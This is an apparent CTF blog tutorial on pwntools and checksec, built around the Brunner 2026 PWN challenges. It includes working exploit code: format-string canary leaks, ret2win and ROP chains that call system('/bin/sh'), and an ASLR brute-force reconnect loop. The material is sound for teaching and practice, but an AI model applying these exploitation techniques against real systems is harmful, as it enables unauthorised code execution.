+++
title = 'pwntools & checksec'
categories = ['Pwn']
date = "2026-08-23T14:00:00+01:00"
scrollToTop = true
+++

# pwntools & checksec: The Binary Exploitation Workbench

If you do any amount of binary exploitation, [pwntools](https://github.com/Gallopsled/pwntools) is the library that turns a fiddly, error-prone process into a few readable lines of Python. It handles the plumbing — spawning the target, talking to it over a socket, packing addresses into the right byte order, parsing leaked pointers — so you can spend your brain on the actual bug. `checksec`, which ships alongside it, is the thirty-second triage you run *first* on every binary to know what you're up against.

This guide covers the workflow I lean on for every pwn challenge, using examples straight from the Brunner 2026 PWN set (*Guessing Game*, *Brunner Stocks*, *Locked Out*, *Pure Notes*).

## Installation

pwntools is a Python package. Install it into a virtualenv or with `pipx`:

```bash
python3 -m pip install --upgrade pwntools
```

This also installs the command-line helpers: `checksec`, `cyclic`, `pwn`, `ROPgadget` (via dependency), and friends. On Kali/most CTF distros it's pre-installed.

## Step 0: Triage with checksec

Before writing a single line of exploit, run `checksec` to see which mitigations are in play. This dictates your entire strategy.

```bash
checksec ./vuln
# or, from inside Python:
#   from pwn import *
#   ELF('./vuln').checksec()
```

Read the output as a checklist:

- **`RELRO` (Partial/Full)** — Full RELRO means the GOT is read-only; no GOT-overwrite. Partial leaves it writable.
- **`Stack` (canary found / No canary)** — A canary means you can't blindly smash the return address; you'll need to leak it first (see *Locked Out*, where a format-string bug leaked the canary with `%9$p`).
- **`NX` (enabled / disabled)** — NX enabled means the stack isn't executable, so you pivot to ROP/ret2libc. NX **disabled** is a gift: drop shellcode on the stack and jump to it (exactly the path in *Brunner Stocks*, where the stack was RWE and a `jmp rsp` gadget landed execution on injected `execve("/bin/sh")` shellcode).
- **`PIE` (enabled / No PIE)** — No PIE means fixed code addresses, so `ret2win` and gadgets work without a leak (*Locked Out*). PIE means you need an address leak before you can aim at anything.

The four answers together tell you the shape of the challenge. Canary + NX + PIE + Full RELRO is "leak everything, then ROP." No canary + NX-disabled is "just deliver shellcode."

## Talking to the target

### context — set it once, forget it

`context` configures architecture, endianness, and logging globally so every helper behaves correctly:

```python
from pwn import *

context.binary = './vuln'          # sets arch/bits/endianness from the ELF
context.log_level = 'info'         # 'debug' prints every byte sent/received
# context.arch = 'amd64'           # set manually if you have no local binary
```

Setting `context.binary` means `p64`, `ROP`, `shellcraft`, and the rest all inherit the right target automatically.

### process() vs remote() — and Brunner's TLS twist

Develop locally against `process`, then flip to `remote` to hit the server:

```python
io = process('./vuln')                       # local testing
io = remote('chal.brunn.er', 1024)           # plain TCP
io = remote('chal.brunn.er', 1024, ssl=True) # Brunner wraps services in TLS
```

That `ssl=True` is a Brunner signature — every remote PWN service in the 2026 set spoke TLS, and forgetting the flag just hangs. A tidy pattern that swaps between local and remote from the command line:

```python
def start():
    if args.REMOTE:
        return remote('chal.brunn.er', 1024, ssl=True)
    return process(context.binary.path)

io = start()   # run `python3 exploit.py REMOTE` to hit the server
```

### The tube API

Every connection is a *tube*. The methods you use constantly:

```python
io.recvuntil(b'guess: ')        # read up to a delimiter
io.recvline()                   # one line
io.recv(64)                     # exactly N bytes
line = io.recvregex(rb'0x[0-9a-f]+')  # grab something matching a regex

io.send(payload)                # raw bytes
io.sendline(payload)            # append newline
io.sendlineafter(b'> ', data)   # wait for prompt, then send — the workhorse

io.interactive()                # hand over to your keyboard once you have a shell
```

## Packing, unpacking, and leaks

Addresses have to hit the wire as little-endian bytes, and leaks come back as bytes you need to turn back into integers. pwntools makes this painless:

```python
payload = p64(0x401234)      # 64-bit pack -> b'\x34\x12\x40\x00\x00\x00\x00\x00'
payload = p32(0xdeadbeef)    # 32-bit pack (used in Locked Out)

leak = u64(io.recv(6).ljust(8, b'\x00'))   # unpack a 6-byte leak into an int
print(hex(leak))
```

Two more that come up in real leaks — recovering a canary or a heap pointer from noisy output:

```python
canary = u64(b'\x00' + io.recv(7))          # canaries have a null LSB
data   = bytes.fromhex(io.recvline().strip().decode())  # or enhex/unhex helpers
```

*Pure Notes* is a good example of the messy end of this: heap-pointer leaks came back UTF-8/Latin-1 mangled and had to be reconstructed byte by byte before `u64` would make sense of them.

## Finding offsets with cyclic

Don't count bytes by hand. Generate a De Bruijn pattern, crash the binary, and let pwntools tell you the exact offset:

```python
pattern = cyclic(200)
# feed `pattern` to the crash, read RSP/RIP from the crash (e.g. 0x6161616b)
offset = cyclic_find(0x6161616b)   # -> the precise overflow offset
```

## Working with the ELF: symbols and gadgets

`context.binary` (an `ELF` object) is your address book:

```python
elf = context.binary
elf.symbols['win']        # address of a function (ret2win)
elf.got['puts']           # GOT entry
elf.plt['system']         # PLT stub
next(elf.search(b'/bin/sh\x00'))   # find a string in the binary
```

For ROP, let pwntools build the chain (auto-solves `pop rdi; ret` and friends):

```python
rop = ROP(elf)
rop.raw(rop.find_gadget(['ret'])[0])   # stack alignment before a libc call
rop.call('system', [next(elf.search(b'/bin/sh\x00'))])
log.info(rop.dump())
payload = flat({offset: rop.chain()})  # flat() lays out the buffer for you
```

When you're hand-picking gadgets (as in *Guessing Game*, where a constrained oracle meant we needed a specific `pop rdi; ret` = `5f c3` and a `"sh\0"` string), `ROP(elf).rdi` and `elf.search` get you there without staring at objdump.

## A complete skeleton

This is the template I start every challenge from — it covers local/remote switching, TLS, and dropping to a shell:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
context.log_level = 'info'

def start():
    if args.REMOTE:
        return remote('chal.brunn.er', 1024, ssl=True)
    return process(elf.path)

io = start()

# 1) leak (canary / libc / PIE base) if needed
io.sendlineafter(b'> ', b'%9$p')
canary = int(io.recvline().strip(), 16)
log.success(f'canary = {canary:#x}')

# 2) build payload
offset = 40
payload = flat({
    offset - 8: p64(canary),   # replace the canary we leaked
    offset + 8: p64(elf.symbols['win']),
})

# 3) send and enjoy
io.sendlineafter(b'> ', payload)
io.interactive()
```

## Bonus: brute-forcing ASLR with a reconnect loop

Some remote challenges expose only a partial leak, leaving a byte or two to guess. Because a wrong guess just crashes the connection, you wrap the whole thing in a loop and keep reconnecting until ASLR lines up — the approach that eventually landed *Guessing Game*:

```python
while True:
    try:
        io = start()
        # ... attempt exploit ...
        io.sendline(b'cat flag*')
        flag = io.recvregex(rb'brunner\{.*\}', timeout=2)
        if flag:
            log.success(flag.decode()); break
    except EOFError:
        io.close()
        continue   # ASLR wasn't in our favour; try again
```

## Best practices

- **Always `checksec` first.** The mitigations decide the technique, not the other way round.
- **Develop against a matching local libc.** Offsets and `one_gadget` constraints are libc-specific — see the companion article on pinning glibc with Docker.
- **Turn on `context.log_level = 'debug'`** when a payload silently fails; seeing the exact bytes on the wire usually reveals the problem instantly.
- **Use `flat()` over string concatenation.** It's readable, it respects `context`, and it saves you from off-by-one padding bugs.

## Conclusion

pwntools doesn't find the bug for you — but once you've found it, it removes almost every excuse for a failed exploit that isn't a genuine logic error. Pair it with a `checksec` habit and a matching local environment, and you'll spend your time on the interesting part. Happy pwning!
